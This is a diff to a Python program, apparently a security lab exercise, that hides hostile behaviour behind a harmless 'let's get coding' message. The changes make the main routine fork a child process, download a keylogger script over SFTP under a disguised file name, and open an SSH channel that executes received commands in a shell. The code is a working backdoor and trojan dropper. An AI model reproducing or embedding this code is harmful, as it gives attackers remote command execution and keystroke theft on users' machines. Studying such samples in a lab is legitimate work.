@@ -8,6 +8,7 @@ import logzero
 from logzero import logger
 import threading
 import subprocess
+import time
 
 
 class sftpClient(object):
@@ -126,10 +127,21 @@ class sshClient(object):
             logger.info("Invoke shell called")
 
             command = self.channel.recv(1024).decode()
-            receivedCommand = subprocess.check_output(command, shell=True)
+            logger.info(f"Received message {command}")
+            p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
 
-            self.channel.sendall(receivedCommand)
-            logger.info(f"Received message{command}")
+
+            print(f"popen communicate{p.communicate()}")
+            self.channel.sendall(command.encode())
+
+            logger.info("Sleeping . . . ")
+            time.sleep(10)
+            logger.info("Awake!")
+            command = self.channel.recv(1024).decode()
+            logger.info(f"Received 2nd message {command}")
+
+            self.channel.close()
+            self.ssh.close()
         except subprocess.CalledProcessError as e:
             logger.error(f"Subprocess error: {e.output.decode()}")
         except paramiko.SSHException as sshErr:
@@ -144,40 +156,20 @@ class sshClient(object):
 
 
 def doMaliciousActivities():
+
+    remotepath = "/home/lab/bin/py/project/a1KeyLogger.py"
+    localpath = "./ZZZZ_NOT_SUSPICIOUS_FILE"
     try:
         pid = os.fork()
         if pid == 0:
             # make password file
             os.system("touch ZZZZ_NOT_SUSPICIOUS_FILE")
 
-            # Open a transport
-            host, port = "localhost", 22
-            transport = paramiko.Transport((host, port))
+            sftp = sftpClient("localhost", 22, "lab", "lab")
+            sftp.downloadFile(remotepath, localpath)
 
-            # authenticate
-            username, password = "lab", "lab"
-            transport.connect(None, username, password)
-
-            # make sftp instnace
-            sftp = paramiko.SFTPClient.from_transport(transport)
-
-            # Download to current directory
-            remotepath = "/home/lab/bin/py/project/a1KeyLogger.py"
-            localpath = "./ZZZZ_NOT_SUSPICIOUS_FILE"
-            sftp.get(remotepath, localpath)
-
-            # Upload
-            # sftp.put(localpath,remotepath)
-
-            # Close
-            if sftp:
-                sftp.close()
-            if transport:
-                transport.close()
-
-            # connect ssh and receive commands
-            SSHClient = sshClient("localhost", 9000, "rick", "jacky")
-            SSHClient.invoke_shell()
+            ssh = sshClient("localhost", 9000, "rick", "jacky")
+            ssh.invoke_shell()
 
         # kill child process
         while True:
@@ -206,9 +198,6 @@ def printNonMaliciousActivity():
     print("Now let's get coding!")
 
 
-remotepath = "/home/lab/bin/py/project/tester"
-localpath = "./ZZZZ_NOT_SUSPICIOUS_FILE"
-
 # main thread
 if __name__ == '__main__':
     try:
@@ -217,12 +206,6 @@ if __name__ == '__main__':
                         backupCount=3, disableStderrLogger=True)
 
         printNonMaliciousActivity()
-
-        sshClient = sshClient("localhost", 9000, "rick", "jacky")
-        sshClient.invoke_shell()
-
-        sftpClient = sftpClient("localhost", 22, "lab", "lab")
-        sftpClient.downloadFile(remotepath, localpath)
-        # doMaliciousActivities()
+        doMaliciousActivities()
     except Exception as err:
         print(err)
